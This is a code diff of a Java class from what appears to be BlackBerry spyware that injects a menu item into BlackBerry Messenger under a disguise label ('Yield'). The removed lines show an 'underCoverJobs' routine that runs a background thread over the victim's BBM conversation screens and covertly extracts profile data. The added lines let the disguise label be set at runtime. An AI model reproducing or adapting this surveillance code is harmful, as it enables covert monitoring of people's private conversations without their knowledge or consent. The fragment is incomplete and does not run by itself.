@@ -16,7 +16,7 @@ import blackberry.injection.MenuWalker;
 import blackberry.utils.Utils;
 
 public class BBMMenuItem extends ApplicationMenuItem {
-	private static final String BBM_MENU = "Yield";
+	private static String bbmMenu = "Yield";
 	//#ifdef DEBUG
 	private static Debug debug = new Debug("BBMMenuItem", DebugLevel.VERBOSE);
 	// #endif
@@ -211,68 +211,16 @@ public class BBMMenuItem extends ApplicationMenuItem {
 	}
 
 	public String toString() {
-		return BBM_MENU;
+		return bbmMenu;
 	}
 
-	Thread ucThread;
-
-	public void underCoverJobs() {
-
-		debug.info("Under cover");
-		undercover = true;
-
-		if (ucThread != null) {
-			return;
-		}
-
-		if (!bbmInjected) {
-			return;
-		}
-
-		ucThread = new Thread(new Runnable() {
-
-			public void run() {
-
-				for (int i = 0; i < conversationScreen.size(); i++) {
-					final Screen screen = conversationScreen.elementAt(i);
-
-					bbmApplication.invokeLater(new Runnable() {
-
-						public void run() {
-							debug.trace("run, extracting profile from: "
-									+ screen);
-							extractProfile(screen);
-						}
-
-					});
-					
-					Utils.sleep(500);
-
-				}
-			}
-
-		});
-
-		ucThread.start();
-
-	}
-
-	public void stopUnderCoverJobs() {
-		debug.info("Stop Under cover");
-		undercover = false;
-
-		// if (ucThread != null) {
-		// ucThread.interrupt();
-		// }
-
-		ucThread = null;
-
-	}
-
-	public void addMenuBBM() {
+	public void addMenuBBM(String menuName) {
 	    //#ifdef DEBUG
         debug.trace("addMenuBBM");
         //#endif
+        
+        bbmMenu = menuName;
+        
 		long bbmid = ApplicationMenuItemRepository.MENUITEM_SYSTEM;
 		// long bbmid = 4470559380030396000L; Non funziona
 		// long bbmid = 5028374280894129973L; Non funziona
